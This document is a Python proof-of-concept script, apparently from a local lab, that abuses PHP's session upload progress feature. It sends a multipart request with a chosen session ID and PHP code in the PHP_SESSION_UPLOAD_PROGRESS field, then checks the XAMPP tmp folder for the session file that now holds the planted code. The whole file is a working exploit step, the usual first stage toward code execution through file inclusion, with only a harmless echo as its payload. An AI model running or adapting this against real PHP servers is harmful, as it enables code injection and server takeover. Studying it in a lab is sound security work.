import requests
import os

URL = "http://localhost:8000/index.php"
SESSION_ID = "hacker123"
TMP_DIR = r"E:\xmapp\tmp"
SESSION_FILE = os.path.join(TMP_DIR, f"sess_{SESSION_ID}")

# Multipart payload structured exactly as PHP expects:
# 1. PHP_SESSION_UPLOAD_PROGRESS field FIRST
# 2. File field SECOND
boundary = "---------------------------974767299852498929531610575"
payload_code = "<?php echo 'PWNED_BY_UPLOAD_PROGRESS'; ?>"

body = (
    f"--{boundary}\r\n"
    f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
    f"{payload_code}\r\n"
    f"--{boundary}\r\n"
    f'Content-Disposition: form-data; name="file"; filename="dummy.txt"\r\n'
    f"Content-Type: text/plain\r\n\r\n"
    f"{'A' * 1024 * 50}\r\n"
    f"--{boundary}--\r\n"
)

headers = {
    "Content-Type": f"multipart/form-data; boundary={boundary}",
    "Cookie": f"PHPSESSID={SESSION_ID}"
}

print(f"[*] Sending multipart upload progress request to {URL}...")
r = requests.post(URL, data=body.encode(), headers=headers)
print(f"[*] Response status: {r.status_code}")
print(f"[*] Checking {TMP_DIR} for {SESSION_FILE}...")
if os.path.exists(SESSION_FILE):
    print(f"[+] FOUND SESSION FILE: {SESSION_FILE}")
    with open(SESSION_FILE, 'r', errors='ignore') as f:
        print(f"[+] Content:\n{f.read()}")
else:
    print("[-] Session file was cleaned up immediately by PHP (session.upload_progress.cleanup = 1).")
